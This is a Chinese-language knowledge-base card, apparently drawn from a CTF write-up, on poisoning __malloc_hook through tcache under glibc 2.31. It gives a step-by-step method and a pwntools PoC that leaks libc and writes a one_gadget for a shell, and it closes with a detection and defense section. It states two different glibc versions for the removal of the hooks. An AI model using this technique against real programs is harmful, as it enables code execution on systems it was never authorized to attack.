---
id: binary-pwn-heap-glibc231-tcache-counts-malloc-hook-onegadget
title: glibc 2.31 tcache counts 校验下的 __malloc_hook 毒化：至少两个同尺寸 chunk 入 bin 才能把 fd 改成 hook 并取 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc231-tcache-counts-check-malloc-hook-onegadget
aliases:
- 2.31 tcache counts 检测
- tcache bins 个数校验
- glibc 2.31 tcache poisoning
- __malloc_hook one_gadget
- 2.31 堆题
tags:
- pwn
- heap
- glibc-2.31
- tcache
- counts-check
- malloc-hook
- one-gadget
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: glibc 2.31（原文标记 libc2.31）
verification:
  verified_by: verifier-V336
  verified_at: '2026-11-08T19:10:52+08:00'
  notes: 已对照原文 2.31 节与图 14-15/相关 pwndbg 图核对：10 次 add(0x80)+delete 后 show(7) 泄 libc、edit(6,p64(malloc_hook))、两次 add 取到 hook、写 one_gadget 0xe3b01、add(12) 触发的 PoC 与卡一致；checksec 显示 Full RELRO/Canary/NX/PIE，图 15/交互 ls 显示 shell。卡对 tcache counts 需 >=2 块的解释与 _int_malloc/__libc_malloc 的 counts 检查一致；2.27 单块毒化差异说明成立。affected_versions=glibc 2.31 与原文 2.31 节标题一致，保留。dedup 无 duplicate/likely_duplicate（related 11 为 fastbin/freehook 等不同基元）；被跳过的 2.23 fake fastbin+malloc_hook 已有 binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget 覆盖，跳过合理。dup-scan(15:21)早于 cards.json(19:03)未覆盖。卡无 sources/URL/文章 ID。
---

## 一句话结论

glibc 2.31 的 tcache 在取出 chunk 时会检查对应 bin 的 `counts` 是否与链表匹配：如果 bin 里只有 0/1 个块，把已释放 chunk 的 `fd` 改成 `__malloc_hook` 后，下一次 malloc 可能根本不会从 tcache 取到被投毒的目标，而是走 fastbin/smallbin 或返回非法地址。要稳定毒化 `__malloc_hook`，必须先在同一个 tcache bin 里放至少两个同尺寸 chunk，让第一次 malloc 取走真实块、第二次 malloc 返回被改写的 `fd` 目标。

## 原理

- **tcache 的 counts 机制**：tcache 每个 size class 有 `entries[]` 与 `counts[]`。`tcache_get` 在取块时检查 `counts[tc_idx] > 0` 且 `entries[tc_idx]` 非空；只有条件成立才把 `entries[tc_idx]` 作为返回值并更新 `counts`。如果 `counts` 为 0，即使你通过 UAF 把某个已释放块的 `fd` 改成了目标地址，malloc 也不会按该链表返回目标。
- **为什么需要两个块**：假设 bin 里只有 1 个块 A（`counts=1`，`entries=A`），你 edit A 的 `fd = __malloc_hook` 后，`counts` 仍是 1；第一次 malloc 返回 A、`counts` 变 0，`entries` 变成 `__malloc_hook`，但下一次 malloc 看到 `counts=0` 就不会从 tcache 返回 `__malloc_hook`。如果 bin 里有 2 个块 A→B（`counts=2`），把 A 的 `fd` 改成 hook 后，第一次 malloc 返回 A、`counts=1`、`entries=hook`，第二次 malloc 才返回 hook。
- **2.27 与 2.31 差异**：2.27 的 tcache 实现没有这类 counts/entries 一致性检查，单个块的 `fd` 被改写后下一次 malloc 往往就能返回目标；2.31 增加了检查，因此 2.27 的“单块毒化”脚本直接套到 2.31 会失败。
- **泄露与布局**：先用 unsorted bin 或 tcache 残留 fd 泄露 libc（原文脚本用 `show` 读出并减去 `0x70` 得到 `__malloc_hook`），再准备至少两个同尺寸（原文 0x80 请求、0x90 chunk）的 free 块；把其中一个块的 `fd` 改成 `__malloc_hook`，连续两次 `add` 让第二次返回 hook 地址，写入 one_gadget。
- **one_gadget 约束**：写入 `__malloc_hook` 的 one_gadget 需要满足寄存器/栈约束；原文在 2.31 上直接写 `libc_base + 0xe3b01`，并在后续 `add` 触发 malloc 时执行。若约束不满足，需用 `realloc_hook`/栈调整或换 gadget。
- **边界**：2.31 仍有 `__malloc_hook`/`__free_hook`；后续版本移除 hook 后该路径失效。Full RELRO/PIE 不影响 hook 劫持，但需要 libc 基址。

## 触发条件

- glibc 2.31 环境（原文 libc2.31），程序存在 UAF（free 后仍可 edit/show）或等价的可写已释放 chunk 的漏洞。
- 能泄露 libc 基址（unsorted bin 残留指针或 tcache fd 等）。
- 能控制至少两个同 size class 的 tcache free 块，并把其中一个的 `fd` 改写为目标地址。
- 目标 libc 有可用的 one_gadget，且触发 malloc 的路径可控（菜单 add 等）。
- 程序未启用会阻止 hook 写入的额外保护（如某些沙箱/CFI），但常规 Full RELRO/PIE/Canary 不阻止。

## 利用步骤

1. 用 checksec 确认 glibc 版本/保护；准备同尺寸的多个 chunk（原文 0x80 请求）。
2. 制造 UAF：free 后不置空指针，保留 edit/show 能力。
3. 泄露 libc：show 已释放块，读取残留 libc 指针；原文脚本用 `malloc_hook = leak - 0x70` 计算，再减 `libc.sym['__malloc_hook']` 得 libc_base。
4. 让至少两个同尺寸块进入同一个 tcache bin（多于 7 个时注意 tcache 满后进 fastbin）。
5. 通过 edit 把其中一个已释放块的 `fd` 写成 `__malloc_hook`。
6. 连续两次 `add` 同尺寸：第一次取走真实块，第二次返回 `__malloc_hook`。
7. 在返回的“块”上写入 one_gadget；再次触发 malloc（如 `add(12,0x80)`）执行 one_gadget。
8. 验证 shell。

## PoC

原文 2.31 脚本（节选，未在本机复现）：

```python
for i in range(10):
    add(i, 0x80)
for i in range(10):
    delete(i)

show(7)
p.recvuntil('content : ')
malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x70
libc_base = malloc_hook - libc.sym['__malloc_hook']
onegadget = libc_base + 0xe3b01

edit(6, p64(malloc_hook))   # 已释放块 fd -> __malloc_hook
add(10, 0x80)               # 取走真实块
add(11, 0x80)               # 返回 __malloc_hook
edit(11, p64(onegadget))    # 写入 one_gadget
add(12, 0x80)               # 触发 malloc -> one_gadget
p.interactive()
```

注意：若 bin 中块数不足两个，`add(11)` 不会返回 hook，脚本会卡住/崩溃；这是 2.31 与 2.27 的关键差异。

## 变体与关联

- **glibc 2.27**：无 counts 检查，单块 fd 毒化即可；见 tcache poisoning 通用技巧。
- **glibc 2.31 + tcache key**：若目标是 double free，需要先清 `tcache_key`；见 `binary-pwn-heap-glibc231-tcache-key-clear-repeated-free-freehook`。
- **__free_hook 变体**：把 fd 毒化到 `__free_hook` 并写 `system`，再 free 一个内容为 `/bin/sh` 的块；与 malloc_hook 路径类似，但触发点是 free。
- **2.35+**：safe-linking 要求 `fd = target ^ (chunk_addr >> 12)`，且 tcache key 可能阻止直接 double free，需先泄露 heap。
- **2.39+**：`__malloc_hook` 已被移除，需改走 FSOP/House of Apple2 等。

## 检测与防御

- **防御**：升级 glibc 到移除 hook 的版本（2.34+ 已移除 malloc/free hooks）；启用 tcache key、safe-linking、double-free 检查；对 UAF（free 不置空）做代码审计。
- **检测**：监控异常 `__malloc_hook`/`__free_hook` 写入（用户态写 libc 全局数据）；tcache counts/entries 不一致；堆块 fd 指向 libc 全局区；one_gadget 常见偏移执行。
- **比赛/CTF**：出题人可通过 Full RELRO/PIE/Canary 增加难度，但不能阻止 hook 劫持；需确保 glibc 版本与 hook 存在性一致。
